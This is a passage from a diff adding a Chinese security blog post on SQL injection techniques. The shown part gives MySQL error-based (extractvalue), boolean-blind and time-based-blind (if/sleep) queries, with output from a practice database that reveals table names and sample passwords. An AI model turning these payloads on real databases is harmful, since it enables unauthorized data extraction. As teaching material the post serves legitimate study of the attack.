+</blockquote>
+<ul>
+<li><p>获取表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select extractvalue(1, concat(0x5c,(select table_name from information_schema.tables where table_schema=database() limit 3,1)));</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;\users&apos;</div></pre></td></tr></table></figure>
+</li>
+<li><p>获取字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select extractvalue(1, concat(0x5c,(select password from users limit 1,1)));</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;\I-kill-you&apos;</div><div class="line">mysql&gt; select extractvalue(1, concat(0x5c,(select password from users limit 0,1)));</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;\Dumb&apos;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="0x04-基于布尔盲注"><a href="#0x04-基于布尔盲注" class="headerlink" title="0x04 基于布尔盲注"></a>0x04 基于布尔盲注</h3><ul>
+<li><p>查看表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select table_name from information_schema.tables where table_schema=database() limit 0,1;</div><div class="line">+------------+</div><div class="line">| table_name |</div><div class="line">+------------+</div><div class="line">| emails     |</div><div class="line">+------------+</div></pre></td></tr></table></figure>
+</li>
+<li><p>获取表名第一个字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1) m;</div><div class="line">+------+</div><div class="line">| m    |</div><div class="line">+------+</div><div class="line">| e    |</div><div class="line">+------+</div></pre></td></tr></table></figure>
+</li>
+<li><p>获取表名第一个字符的ASCII</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) m;</div><div class="line">+------+</div><div class="line">| m    |</div><div class="line">+------+</div><div class="line">|  101 |</div><div class="line">+------+</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>获取字段名与字段内容原理一样。</p>
+<h3 id="0x05-基于时间盲注"><a href="#0x05-基于时间盲注" class="headerlink" title="0x05 基于时间盲注"></a>0x05 基于时间盲注</h3><p>If(expr1,expr2,expr3)    判断语句<br>if(database()=’security’,1,2) 判断数据库名是否为security，正确返回1，错误返回2。基于时间的注入和基于布尔差不多，引入了if语句进行判断。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;117,sleep(5),NULL) m;</div><div class="line">+------+</div><div class="line">| m    |</div><div class="line">+------+</div><div class="line">| NULL |</div><div class="line">+------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line">mysql&gt; select if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(5),NULL) m;</div><div class="line">+------+</div><div class="line">| m    |</div><div class="line">+------+</div><div class="line">|    0 |</div><div class="line">+------+</div><div class="line">1 row in set (5.00 sec)</div></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+      <strong>本文作者：</strong>
+      Hello_C
+    </li>
+    <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://yoursite.com/漏洞/2017/07/01/SQL注入技巧.html" title="SQL注入技巧">http://yoursite.com/漏洞/2017/07/01/SQL注入技巧.html</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong>
+      本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sql注入/" rel="tag"><i class="fa fa-tag"></i> sql注入</a>
+          
+            <a href="/tags/漏洞/" rel="tag"><i class="fa fa-tag"></i> 漏洞</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/漏洞/2017/06/30/XXE漏洞攻防.html" rel="next" title="XXE漏洞攻防">
+                <i class="fa fa-chevron-left"></i> XXE漏洞攻防
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="漏洞/2017/07/01/SQL注入技巧.html"
+           data-title="SQL注入技巧" data-url="http://yoursite.com/漏洞/2017/07/01/SQL注入技巧.html">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="Hello_C" />
+          <p class="site-author-name" itemprop="name">Hello_C</p>
+           
+              <p class="site-description motion-element" itemprop="description">渗透测试  网络安全   web</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">61</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">19</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/zjwfc" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/5664757301" target="_blank" title="微博">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  微博
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.dropsec.xyz" title="Drops团队主页" target="_blank">Drops团队主页</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://ctf.dropsec.xyz" title="Drops攻防平台" target="_blank">Drops攻防平台</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://fgp.dropsec.xyz" title="F.G.PNotes" target="_blank">F.G.PNotes</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://lyx.dropsec.xyz" title="lazy" target="_blank">lazy</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://byd.dropsec.xyz" title="Joy_nick" target="_blank">Joy_nick</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://wkh.dropsec.xyz" title="X加油,未来" target="_blank">X加油,未来</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://jdrops.dropsec.xyz" title="J_Drops" target="_blank">J_Drops</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://lzx.dropsec.xyz" title="凡尘" target="_blank">凡尘</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://cq.dropsec.xyz" title="qiqi" target="_blank">qiqi</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://yunnigu.dropsec.xyz" title="云" target="_blank">云</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://isron.cn" title="Isron" target="_blank">Isron</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://flashsec.cn" title="Flash|Sec" target="_blank">Flash|Sec</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-SQL注入"><span class="nav-number">1.</span> <span class="nav-text">0x01 SQL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-相关函数"><span class="nav-number">2.</span> <span class="nav-text">0x02 相关函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-基于报错注入"><span class="nav-number">3.</span> <span class="nav-text">0x03 基于报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-基于布尔盲注"><span class="nav-number">4.</span> <span class="nav-text">0x04 基于布尔盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-基于时间盲注"><span class="nav-number">5.</span> <span class="nav-text">0x05 基于时间盲注</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2015 - 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Hello_C</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+  
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/src/love.js"></script>
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="true"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"zjwfc"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("JCRSaBjs1fI4FctoIzV1M8Kh-gzGzoHsz", "HPfVnkuIFClUv2BUNyy20FlB");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+</body>
+</html>
